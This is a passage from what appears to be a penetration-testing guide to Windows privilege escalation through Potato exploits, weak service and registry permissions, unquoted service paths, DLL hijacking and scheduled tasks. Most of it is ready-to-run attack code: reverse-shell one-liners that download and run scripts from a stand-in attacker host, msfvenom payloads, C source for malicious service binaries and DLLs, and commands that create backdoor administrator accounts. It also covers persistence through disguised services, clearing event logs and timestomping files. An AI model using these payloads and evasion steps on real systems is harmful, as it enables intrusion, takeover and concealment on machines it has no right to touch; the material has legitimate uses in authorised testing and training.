**Description:** NBNS spoofing + NTLM relay to escalate from service account to SYSTEM.

**Requirements:**

- SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege enabled
- Windows 7, 8, 10, Server 2008, 2012 (pre-2016 patches)

**[Inference]** Exploitation typically requires precompiled binary:

```cmd
potato.exe -ip ATTACKER_IP -cmd "cmd.exe /c whoami > C:\temp\output.txt" -enable_httpserver true -enable_defender true
```

**Rotten Potato**

**Description:** COM/DCOM manipulation to obtain SYSTEM token.

**Requirements:**

- SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
- Network service, local service, or IIS account context

**Metasploit usage:**

```bash
msfconsole
use exploit/windows/local/ms16_075_reflection
set SESSION 1
exploit
```

**Manual exploitation:**

```cmd
rottenpotato.exe -cmd "cmd.exe"
```

**Juicy Potato**

**Description:** Improved version of Rotten Potato with CLSID manipulation.

**Requirements:**

- SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
- Windows 7, 8, 10 (pre-1809), Server 2008, 2012, 2016

**Exploitation:**

```cmd
rem Find working CLSID for your Windows version
juicypotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}

rem Common CLSIDs:
rem Windows 10 Enterprise: {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
rem Windows Server 2016: {752073A1-23F2-4396-85F0-8FDB879ED0ED}
rem Windows Server 2012: {e60687f7-01a1-40aa-86ac-db1cbf673334}
```

**Example with custom command:**

```cmd
juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > c:\temp\out.txt" -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```

**Reverse shell with Juicy Potato:**

```cmd
juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex(new-object net.webclient).downloadstring('http://ATTACKER_IP/shell.ps1')" -t * -c {CLSID}
```

**Rogue Potato**

**Description:** Juicy Potato successor for Windows 10 1809+, Server 2019+.

**Requirements:**

- SeImpersonatePrivilege
- Windows 10 1809+, Server 2019+

**Exploitation:**

```cmd
RoguePotato.exe -r ATTACKER_IP -e "cmd.exe" -l 9999
```

**PrintSpoofer**

**Description:** Abuses Print Spooler service for token impersonation.

**Requirements:**

- SeImpersonatePrivilege
- All Windows versions (including patched against Potato exploits)

**Exploitation:**

```cmd
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "powershell.exe -ep bypass iex(new-object net.webclient).downloadstring('http://ATTACKER_IP/shell.ps1')"
```

**GodPotato**

**Description:** Latest Potato variant working on recent Windows versions.

**Requirements:**

- SeImpersonatePrivilege
- Windows Server 2012 - 2022, Windows 8 - 11

**Exploitation:**

```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c net localgroup administrators attacker /add"
```

#### Manual Token Impersonation

**Using Incognito (Metasploit):**

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
exploit

# After getting meterpreter session
load incognito
list_tokens -u
impersonate_token "NT AUTHORITY\\SYSTEM"
```

**PowerShell token stealing:**

```powershell
# Requires SeDebugPrivilege
$signature = @"
[DllImport("advapi32.dll", SetLastError = true)]
public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);
"@

Add-Type -MemberDefinition $signature -Name "Win32" -Namespace Win32Functions
# Additional implementation required
```

**[Inference]** Manual token impersonation requires deep Windows API knowledge and is complex to implement. Prebuilt tools like Potato variants are more practical.

### Weak Service Permissions

Windows services running with elevated privileges (LocalSystem, NetworkService) can be exploited if their configurations allow modification by low-privileged users.

#### Service Permission Types

**Service permissions:**

- **SERVICE_CHANGE_CONFIG** - Modify service configuration
- **SERVICE_START** - Start the service
- **SERVICE_STOP** - Stop the service
- **WRITE_DAC** - Modify service permissions
- **WRITE_OWNER** - Change service owner
- **GENERIC_WRITE** - Write access to service
- **GENERIC_ALL** - Full control

**File permissions on service executable:**

- **WRITE** - Modify service binary
- **FULL_CONTROL** - Complete access

#### Enumerating Service Permissions

**List all services:**

```cmd
sc query
net start
wmic service list brief
```

**PowerShell service enumeration:**

```powershell
Get-Service
Get-WmiObject win32_service | Select-Object Name, DisplayName, PathName, StartMode, State, StartName
```

**Check specific service configuration:**

```cmd
sc qc ServiceName
sc query ServiceName
```

**View service permissions with accesschk.exe (Sysinternals):**

```cmd
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *
accesschk.exe -uwcqv %USERNAME% *
```

**Check service permissions (native):**

```cmd
sc sdshow ServiceName
```

**Interpret SDDL (Security Descriptor Definition Language):**

- `D:` - DACL (Discretionary Access Control List)
- `(A;;CCLCSWRPWPDTLOCRRC;;;SY)` - ACE (Access Control Entry)
    - `A` - Allow ACE
    - `CC` - SERVICE_QUERY_CONFIG
    - `LC` - SERVICE_QUERY_STATUS
    - `SW` - SERVICE_ENUMERATE_DEPENDENTS
    - `RP` - SERVICE_START
    - `WP` - SERVICE_STOP
    - `DT` - SERVICE_PAUSE_CONTINUE
    - `LO` - SERVICE_INTERROGATE
    - `CR` - SERVICE_USER_DEFINED_CONTROL
    - `RC` - READ_CONTROL
    - `SY` - Local System

**[Inference]** Look for ACEs granting dangerous permissions to low-privileged groups like "AU" (Authenticated Users), "BU" (Built-in Users), or specific user accounts.

#### PowerUp.ps1 - Automated Service Enumeration

**PowerUp (PowerSploit) usage:**

```powershell
# Download and import
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')

# Run all checks
Invoke-AllChecks

# Specific service checks
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ModifiableService
Get-ServiceDetail
```

**Key PowerUp functions:**

- **Get-ModifiableServiceFile** - Services with writable binaries
- **Get-ModifiableService** - Services with weak permissions
- **Get-ServiceUnquoted** - Unquoted service paths
- **Get-ServiceDetail** - Detailed service information

#### Exploiting Weak Service Binary Permissions

**Scenario:** Service executable has write permissions for low-privileged users.

**Identify writable service binaries:**

```cmd
rem Using accesschk
accesschk.exe -wuqv "C:\Program Files\*" -accepteula
accesschk.exe -wvu "C:\Program Files\CustomService\service.exe"

rem Check permissions
icacls "C:\Program Files\CustomService\service.exe"
```

**Exploitation steps:**

**1. Backup original binary:**

```cmd
copy "C:\Program Files\CustomService\service.exe" "C:\temp\service.exe.bak"
```

**2. Create malicious service binary:**

```c
// Simple reverse shell service
#include <windows.h>
#include <stdio.h>

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);

int main() {
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "CustomService";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
    StartServiceCtrlDispatcher(ServiceTable);
    return 0;
}

void ServiceMain(int argc, char** argv) {
    ServiceStatus.dwServiceType = SERVICE_WIN32;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    hStatus = RegisterServiceCtrlHandler("CustomService", (LPHANDLER_FUNCTION)ControlHandler);
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(hStatus, &ServiceStatus);
    
    system("cmd.exe /c powershell -ep bypass -c iex(new-object net.webclient).downloadstring('http://ATTACKER_IP/shell.ps1')");
}

void ControlHandler(DWORD request) {
    return;
}
```

**Compile:**

```cmd
rem Using MinGW or Visual Studio
x86_64-w64-mingw32-gcc service.c -o malicious.exe
```

**3. Replace service binary:**

```cmd
move /Y malicious.exe "C:\Program Files\CustomService\service.exe"
```

**4. Restart service:**

```cmd
sc stop CustomService
sc start CustomService

rem Or wait for automatic restart/reboot
```

**Alternative - Simple add user payload:**

```cmd
rem Create batch script
echo net user attacker Password123! /add > C:\temp\adduser.bat
echo net localgroup administrators attacker /add >> C:\temp\adduser.bat

rem Create service wrapper
copy C:\Windows\System32\cmd.exe "C:\Program Files\CustomService\service.exe"
sc config CustomService binpath= "cmd.exe /c C:\temp\adduser.bat"
sc start CustomService
```

#### Exploiting Weak Service Configuration Permissions

**Scenario:** Service configuration can be modified (SERVICE_CHANGE_CONFIG permission).

**Check if service is modifiable:**

```cmd
accesschk.exe -uwcqv Users CustomService
```

**Exploitation using sc.exe:**

**1. Check current service configuration:**

```cmd
sc qc CustomService
```

**2. Modify service binary path:**

```cmd
sc config CustomService binpath= "cmd.exe /c net user attacker Password123! /add"
```

**3. Start service:**

```cmd
sc start CustomService
```

**4. Restore original configuration (optional):**

```cmd
sc config CustomService binpath= "C:\Program Files\CustomService\original.exe"
```

**Alternative payloads:**

```cmd
rem Add administrator user
sc config CustomService binpath= "cmd.exe /c net localgroup administrators attacker /add"

rem Reverse shell
sc config CustomService binpath= "cmd.exe /c powershell -ep bypass iex(new-object net.webclient).downloadstring('http://ATTACKER_IP/shell.ps1')"

rem Execute binary from writable location
sc config CustomService binpath= "C:\temp\payload.exe"
```

#### Unquoted Service Path Exploitation

**Scenario:** Service path contains spaces and is not quoted, allowing path hijacking.

**Understanding the vulnerability:**

If service path is: `C:\Program Files\Custom Service\service.exe`

Windows searches in order:

1. `C:\Program.exe`
2. `C:\Program Files\Custom.exe`
3. `C:\Program Files\Custom Service\service.exe`

**Identify unquoted service paths:**

```cmd
wmic service get name,pathname,displayname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

**PowerShell query:**

```powershell
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notmatch "`"" -and $_.PathName -notmatch "C:\\Windows"} | Select-Object Name, PathName, StartMode
```

**Using PowerUp:**

```powershell
Get-ServiceUnquoted
```

**Exploitation steps:**

**1. Identify writable directory in path:**

```cmd
rem Check permissions on each directory
icacls "C:\Program Files"
accesschk.exe -uwdq "C:\Program Files"
```

**2. Place malicious executable:**

```cmd
rem If C:\Program Files is writable (unlikely but possible)
copy payload.exe "C:\Program Files\Custom.exe"

rem More realistic scenario - C:\Program is writable
copy payload.exe "C:\Program.exe"
```

**3. Restart service or wait for reboot:**
```cmd
sc stop "Custom Service"
sc start "Custom Service"

rem Or trigger reboot if service starts automatically
shutdown /r /t 0
````

**Alternative exploitation with different paths:**

```cmd
rem Service path: C:\Program Files\Some Company\Application\service.exe

rem Try these locations in order:
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Company\Application.exe
```

**Verify writability:**

```powershell
# PowerShell script to check all potential hijack locations
function Test-UnquotedServicePath {
    $services = Get-WmiObject -Class Win32_Service | Where-Object {
        $_.PathName -notmatch "`"" -and 
        $_.PathName -notmatch "C:\\Windows" -and
        $_.PathName -match " "
    }
    
    foreach ($service in $services) {
        $path = $service.PathName -replace '\.exe.*$', '.exe'
        $path = $path.Trim()
        
        # Get all potential hijack paths
        $pathParts = $path -split ' '
        $testPaths = @()
        
        for ($i = 0; $i -lt $pathParts.Count - 1; $i++) {
            $testPath = ($pathParts[0..$i] -join ' ') + '.exe'
            $testPaths += $testPath
        }
        
        foreach ($testPath in $testPaths) {
            $directory = Split-Path $testPath -Parent
            if (Test-Path $directory) {
                $acl = Get-Acl $directory
                # Check if writable
                Write-Host "Service: $($service.Name)"
                Write-Host "Potential hijack: $testPath"
                Write-Host "Directory: $directory"
            }
        }
    }
}

Test-UnquotedServicePath
```

#### Exploiting Service DLL Hijacking

**Scenario:** Service loads DLLs from writable locations or uses insecure search order.

**Identify DLL search order issues:**

```cmd
rem Monitor service DLL loading with Process Monitor (Procmon)
rem Look for "NAME NOT FOUND" results in writable directories
```

**Common vulnerable DLL locations:**

- Service executable directory
- Current working directory
- System directories (if PATH is hijacked)
- Application directory

**Exploitation steps:**

**1. Identify missing or hijackable DLL:**

```cmd
rem Use Process Monitor or manual testing
rem Check service dependencies
sc qc ServiceName
```

**2. Create malicious DLL:**

```c
// malicious.dll
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            system("cmd.exe /c net user attacker Password123! /add");
            system("cmd.exe /c net localgroup administrators attacker /add");
            break;
    }
    return TRUE;
}
```

**Compile DLL:**

```cmd
rem Using MinGW
x86_64-w64-mingw32-gcc -shared -o malicious.dll malicious.c

rem Using Visual Studio
cl /LD malicious.c
```

**3. Place DLL in hijackable location:**

```cmd
copy malicious.dll "C:\Program Files\VulnerableService\hijack.dll"
```

**4. Restart service:**

```cmd
sc stop VulnerableService
sc start VulnerableService
```

**Advanced DLL hijacking with function forwarding:**

```c
// Maintains service functionality while executing payload
#include <windows.h>

#pragma comment(linker, "/export:ServiceMain=original.ServiceMain")

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunPayload, NULL, 0, NULL);
    }
    return TRUE;
}

void RunPayload() {
    system("powershell -ep bypass -c iex(new-object net.webclient).downloadstring('http://ATTACKER_IP/shell.ps1')");
}
```

#### AlwaysInstallElevated Registry Exploitation

**Scenario:** Windows Installer configured to install packages with elevated privileges for all users.

**Check AlwaysInstallElevated setting:**

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

**Both values must be set to 1 for exploitation:**

```
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

**PowerShell check:**

```powershell
$HKLM = Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
$HKCU = Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue

if ($HKLM.AlwaysInstallElevated -eq 1 -and $HKCU.AlwaysInstallElevated -eq 1) {
    Write-Host "AlwaysInstallElevated is enabled - MSI exploitation possible"
}
```

**Exploitation with MSFVenom:**

```bash
# Generate malicious MSI package
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o malicious.msi

# Transfer to target and install
```

**On target:**

```cmd
msiexec /quiet /qn /i malicious.msi
```

**Alternative - Add user MSI:**

```bash
# Create MSI that adds administrator user
msfvenom -p windows/adduser USER=attacker PASS=Password123! -f msi -o adduser.msi
```

**PowerUp exploitation:**

```powershell
Write-UserAddMSI
# Generates and installs MSI to add user
```

#### Service Registry Key Permissions

**Scenario:** Service registry keys have weak permissions allowing modification.

**Service registry location:**

```
HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
```

**Check registry key permissions:**

```cmd
accesschk.exe -kvusw HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService

reg query HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService
```

**PowerShell permission check:**

```powershell
$acl = Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\VulnerableService"
$acl.Access | Where-Object {$_.IdentityReference -notmatch "SYSTEM|Administrators"}
```

**Exploitation - Modify ImagePath:**

```cmd
rem Change service binary path via registry
reg add HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\payload.exe" /f

rem Restart service
sc stop VulnerableService
sc start VulnerableService
```

**Exploitation - Modify service type to interact with desktop:**

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService /v Type /t REG_DWORD /d 0x110 /f
```

**Add dependencies to delay service start:**

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService /v DependOnService /t REG_MULTI_SZ /d "NonExistentService" /f
```

#### Automated Service Exploitation with PowerUp

**Complete PowerUp workflow:**

```powershell
# Download and load PowerUp
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')

# Run all checks
Invoke-AllChecks | Out-File -FilePath C:\temp\powerup_results.txt

# Exploit modifiable service
Invoke-ServiceAbuse -Name VulnerableService -Command "net user attacker Password123! /add"

# Exploit modifiable service file
Write-ServiceBinary -Name VulnerableService -Command "net localgroup administrators attacker /add"

# Exploit unquoted service path
Write-HijackDll -DllPath "C:\Program Files\Vulnerable.dll" -Command "net user attacker Password123! /add"
```

**Specific PowerUp exploitation functions:**

**Invoke-ServiceAbuse:**

```powershell
# Modify service to run command
Invoke-ServiceAbuse -Name VulnerableService -UserName "DOMAIN\User" -Command "powershell.exe -ep bypass -c iex(new-object net.webclient).downloadstring('http://ATTACKER_IP/shell.ps1')"
```

**Install-ServiceBinary:**

```powershell
# Replace service binary
Install-ServiceBinary -Name VulnerableService -Command "cmd.exe /c net user attacker Password123! /add && net localgroup administrators attacker /add"
```

**Restore-ServiceBinary:**

```powershell
# Restore original service binary after exploitation
Restore-ServiceBinary -Name VulnerableService
```

#### Service Exploitation via Scheduled Tasks

**Scenario:** Scheduled task runs with elevated privileges and can be modified.

**Enumerate scheduled tasks:**

```cmd
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr /i "Task To Run:"
```

**PowerShell enumeration:**

```powershell
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM" -or $_.Principal.UserId -eq "Administrators"}

Get-ScheduledTask | Select-Object TaskName, TaskPath, @{Name="RunAsUser";Expression={$_.Principal.UserId}}
```

**Check task permissions:**

```cmd
accesschk.exe -quvw "C:\Windows\System32\Tasks\TaskName"

icacls "C:\Windows\System32\Tasks\TaskName"
```

**Exploitation - Modify task action:**

```cmd
rem View task details
schtasks /query /tn "TaskName" /fo LIST /v

rem Delete existing task
schtasks /delete /tn "TaskName" /f

rem Create modified task
schtasks /create /tn "TaskName" /tr "cmd.exe /c net user attacker Password123! /add" /sc onstart /ru SYSTEM /f

rem Or modify existing
schtasks /change /tn "TaskName" /tr "C:\temp\payload.exe"

rem Trigger task
schtasks /run /tn "TaskName"
```

**PowerShell task modification:**

```powershell
# Get task object
$task = Get-ScheduledTask -TaskName "VulnerableTask"

# Modify action
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c net user attacker Password123! /add"
Set-ScheduledTask -TaskName "VulnerableTask" -Action $action

# Run task
Start-ScheduledTask -TaskName "VulnerableTask"
```

**Create new elevated task:**

```powershell
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -c iex(new-object net.webclient).downloadstring('http://ATTACKER_IP/shell.ps1')"
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName "SystemUpdate" -Action $action -Trigger $trigger -Principal $principal
Start-ScheduledTask -TaskName "SystemUpdate"
```

#### Metasploit Service Exploitation

**Using Metasploit for automated service exploitation:**

```bash
msfconsole

# Search for service exploits
search service windows local

# Modifiable service exploitation
use exploit/windows/local/service_permissions
set SESSION 1
set AGGRESSIVE true
exploit

# Unquoted service path
use exploit/windows/local/unquoted_service_path
set SESSION 1
exploit

# Trusted service path
use exploit/windows/local/trusted_service_path
set SESSION 1
exploit

# Always Install Elevated
use exploit/windows/local/always_install_elevated
set SESSION 1
exploit
```

#### Service Exploitation Persistence

**Create new malicious service for persistence:**

```cmd
rem Create service
sc create BackdoorService binpath= "cmd.exe /c powershell -ep bypass -c iex(new-object net.webclient).downloadstring('http://ATTACKER_IP/shell.ps1')" start= auto

rem Start service
sc start BackdoorService

rem Configure service to restart on failure
sc failure BackdoorService reset= 86400 actions= restart/60000/restart/60000/restart/60000
```

**PowerShell service creation:**

```powershell
New-Service -Name "SystemMonitor" -BinaryPathName "C:\Windows\System32\cmd.exe /c powershell -ep bypass -encodedCommand <BASE64_PAYLOAD>" -DisplayName "System Resource Monitor" -StartupType Automatic

Start-Service -Name "SystemMonitor"
```

**Hide service from services.msc:**

```cmd
rem Set service type to driver (harder to spot)
reg add HKLM\SYSTEM\CurrentControlSet\Services\BackdoorService /v Type /t REG_DWORD /d 0x1 /f

rem Or set to kernel driver
reg add HKLM\SYSTEM\CurrentControlSet\Services\BackdoorService /v Type /t REG_DWORD /d 0x2 /f
```

**Service with legitimate-looking name:**

```cmd
sc create "Windows Update Service Manager" binpath= "C:\Windows\System32\svchost.exe -k netsvcs -p -s BackdoorService" start= auto displayname= "Windows Update Service Manager"
```

#### Defense Evasion for Service Exploitation

**Clear service event logs:**

```cmd
wevtutil cl System
wevtutil cl Security
```

**Modify service to run as different user:**

```cmd
sc config ServiceName obj= "NT AUTHORITY\NetworkService" password= ""
```

**Set service to delayed start (less suspicious):**

```cmd
sc config ServiceName start= delayed-auto
```

**Remove service after exploitation:**

```cmd
sc stop BackdoorService
sc delete BackdoorService
```

**Timestomp service binary:**

```powershell
# Match timestamps to legitimate file
$ref = Get-Item "C:\Windows\System32\svchost.exe"
$target = Get-Item "C:\temp\malicious.exe"

$target.CreationTime = $ref.CreationTime
$target.LastWriteTime = $ref.LastWriteTime
$target.LastAccessTime = $ref.LastAccessTime
```

---

### Unquoted Service Paths

#### Understanding the Vulnerability

When a service executable path contains spaces and is not enclosed in quotes, Windows searches for the executable in multiple locations due to space interpretation ambiguity.

**Example vulnerable path:**

```
C:\Program Files\Some Application\service.exe
```

**Windows searches in this order:**

1. `C:\Program.exe`
2. `C:\Program Files\Some.exe`
3. `C:\Program Files\Some Application\service.exe`

If an attacker can write to earlier paths, they can place a malicious executable that runs with the service's privileges.

#### Enumeration via PowerShell

**Find unquoted service paths:**

```powershell
# Query all services with unquoted paths
Get-WmiObject -Class Win32_Service | 
    Where-Object { $_.PathName -match '^[^"].*\s+.*' -and $_.PathName -notmatch '^[A-Z]:\\Windows\\' } |
    Select-Object Name, DisplayName, PathName, StartMode, State, StartName |
    Format-List

# More specific filtering
Get-WmiObject -Class Win32_Service |
    Where-Object {
        $_.PathName -notmatch '^"' -and 
        $_.PathName -match '\s' -and
        $_.PathName -notmatch '^[A-Z]:\\Windows\\'
    } |
    Select-Object Name, PathName, StartName
```

**Using Get-CimInstance (PowerShell 3.0+):**

```powershell
Get-CimInstance -ClassName Win32_Service |
    Where-Object {
        $_.PathName -notmatch '^"' -and 
        $_.PathName -match '\s' -and
        $_.StartMode -ne 'Disabled'
    } |
    Select-Object Name, PathName, StartName, StartMode
```

#### Enumeration via CMD

**Using wmic:**

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

**Using sc query:**

```cmd
sc query state= all | findstr "SERVICE_NAME:" >> services.txt
FOR /F "tokens=2 delims= " %i in (services.txt) DO @echo %i & @sc qc %i | findstr "BINARY_PATH_NAME" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

#### Checking Write Permissions

**Test write access to directories:**

```powershell
# Function to check write permissions
function Test-WriteAccess {
    param([string]$Path)
    
    try {
        $testFile = Join-Path $Path "test_$(Get-Random).tmp"
        [System.IO.File]::WriteAllText($testFile, "test")
        Remove-Item $testFile -Force
        return $true
    } catch {
        return $false
    }
}

# Check each potential exploit path
$service = Get-WmiObject -Class Win32_Service | 
    Where-Object { $_.PathName -notmatch '^"' -and $_.PathName -match '\s' } |
    Select-Object -First 1

$pathParts = $service.PathName -split '\s+'
$testPaths = @()

for ($i = 0; $i -lt ($pathParts.Length - 1); $i++) {
    $testPath = $pathParts[0..$i] -join ' '
    $dir = Split-Path $testPath -Parent
    if (Test-Path $dir) {
        $testPaths += [PSCustomObject]@{
            Directory = $dir
            TargetFile = Split-Path $testPath -Leaf
            Writable = Test-WriteAccess $dir
        }
    }
}

$testPaths | Where-Object { $_.Writable } | Format-Table
```

**Using icacls:**

```cmd
icacls "C:\Program Files"
icacls "C:\Program Files\Some Application"

REM Look for write permissions:
REM (F) = Full Control
REM (M) = Modify
REM (W) = Write
```

**Using accesschk (Sysinternals):**

```cmd
accesschk.exe -uwdqs "C:\Program Files"
accesschk.exe -uwdqs Users "C:\Program Files"
accesschk.exe -uwdqs "Authenticated Users" "C:\Program Files"
```

#### Exploitation Process

**1. Identify vulnerable service:**

```powershell
$vulnService = Get-WmiObject -Class Win32_Service |
    Where-Object { 
        $_.PathName -eq 'C:\Program Files\Vulnerable App\service.exe' -and
        $_.StartName -eq 'LocalSystem'
    }

Write-Host "Service Name: $($vulnService.Name)"
Write-Host "Start Mode: $($vulnService.StartMode)"
Write-Host "State: $($vulnService.State)"
```

**2. Create malicious executable:**

```c
// Simple reverse shell (compile with MinGW)
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    system("cmd.exe /c net user hacker Passw0rd! /add");
    system("cmd.exe /c net localgroup administrators hacker /add");
    return 0;
}
```

**Compile:**

```bash
# On Kali Linux
i686-w64-mingw32-gcc exploit.c -o Program.exe

# Or use msfvenom
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o Program.exe
```

**3. Place malicious executable:**

```powershell
# Copy to writable directory
Copy-Item .\Program.exe "C:\Program Files\Program.exe"

# Verify placement
Get-Item "C:\Program Files\Program.exe"
```

**4. Trigger service restart:**

```powershell
# Stop service (requires appropriate permissions)
Stop-Service -Name "VulnerableService" -Force

# Start service (triggers malicious executable)
Start-Service -Name "VulnerableService"

# Alternative: Wait for system reboot if service is automatic
```

**Using CMD:**

```cmd
sc stop VulnerableService
sc start VulnerableService

REM Or restart the system if auto-start service
shutdown /r /t 0
```

#### Detection and Verification

**Monitor service execution:**

```powershell
# Check if malicious file executed
Get-EventLog -LogName System -Source "Service Control Manager" -Newest 10 |
    Where-Object { $_.Message -match "VulnerableService" }

# Verify privilege escalation
net user hacker
net localgroup administrators
```

### Writable Registry Keys

#### Understanding Registry-based Privilege Escalation

Windows services and applications store configuration in the registry. If registry keys controlling service parameters are writable, attackers can modify:

- Service executable paths (ImagePath)
- Service startup parameters
- DLL search paths
- Application auto-start entries

#### Service Registry Key Enumeration

**Service registry locations:**

```
HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
```

**Enumerate service registry keys:**

```powershell
# List all service registry keys
Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services" | Select-Object Name

# Get specific service configuration
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\ServiceName"

# Check ImagePath value
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\ServiceName" -Name ImagePath
```

**Find services with modifiable registry keys:**

```powershell
# Get current user's SID
$userSID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value

# Check registry permissions
$services = Get-ChildItem "HKLM:\SYSTEM\CurrentControlSet\Services"

foreach ($service in $services) {
    try {
        $acl = Get-Acl $service.PSPath -ErrorAction Stop
        $writeAccess = $acl.Access | Where-Object {
            ($_.IdentityReference -match "Users|Everyone|BUILTIN\\Users|Authenticated Users") -and
            ($_.RegistryRights -match "FullControl|WriteKey|SetValue") -and
            ($_.AccessControlType -eq "Allow")
        }
        
        if ($writeAccess) {
            [PSCustomObject]@{
                ServiceName = $service.PSChildName
                Path = $service.Name
                Identity = ($writeAccess.IdentityReference | Select-Object -Unique) -join ", "
                Rights = ($writeAccess.RegistryRights | Select-Object -Unique) -join ", "
            }
        }
    } catch {}
}
```

#### Registry Permission Checking

**Using PowerShell Get-Acl:**

```powershell
# Check specific service key permissions
$acl = Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\VulnerableService"
$acl.Access | Format-Table IdentityReference, RegistryRights, AccessControlType

# Check if current user has write access
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$acl.Access | Where-Object { 
    $_.IdentityReference -eq $currentUser -and 
    $_.RegistryRights -match "WriteKey|FullControl|SetValue"
}
```

**Using accesschk (Sysinternals):**

```cmd
REM Check service registry key permissions
accesschk.exe -kvuqsw HKLM\System\CurrentControlSet\Services

REM Check specific service
accesschk.exe -kvuqsw HKLM\System\CurrentControlSet\Services\VulnerableService

REM Look for KEY_WRITE, KEY_ALL_ACCESS for current user/groups
```

**Using reg query:**

```cmd
REM Query service configuration
reg query HKLM\System\CurrentControlSet\Services\VulnerableService

REM Check permissions (requires specific tools or PowerShell)
```

#### Exploiting Writable ImagePath

**1. Identify writable service:**

```powershell
# Find service with writable ImagePath
$service = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\VulnerableService"
Write-Host "Current ImagePath: $($service.ImagePath)"
Write-Host "Service runs as: $((Get-WmiObject Win32_Service -Filter "Name='VulnerableService'").StartName)"
```

**2. Modify ImagePath to malicious executable:**

```powershell
# Set ImagePath to malicious binary
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnerableService" -Name ImagePath -Value "C:\Temp\evil.exe"

# Verify modification
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\VulnerableService" -Name ImagePath
```

**Using reg add:**

```cmd
reg add "HKLM\System\CurrentControlSet\Services\VulnerableService" /v ImagePath /t REG_EXPAND_SZ /d "C:\Temp\evil.exe" /f
```

**3. Restart service:**

```powershell
Restart-Service -Name VulnerableService
```

#### Exploiting Writable Service Parameters

**Modify service startup type:**

```powershell
# Change to automatic start
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\VulnerableService" -Name Start -Value 2

# Start values:
# 2 = Automatic
# 3 = Manual
# 4 = Disabled
```

**Add dependencies to control execution order:**

```powershell
# Make service dependent on malicious service
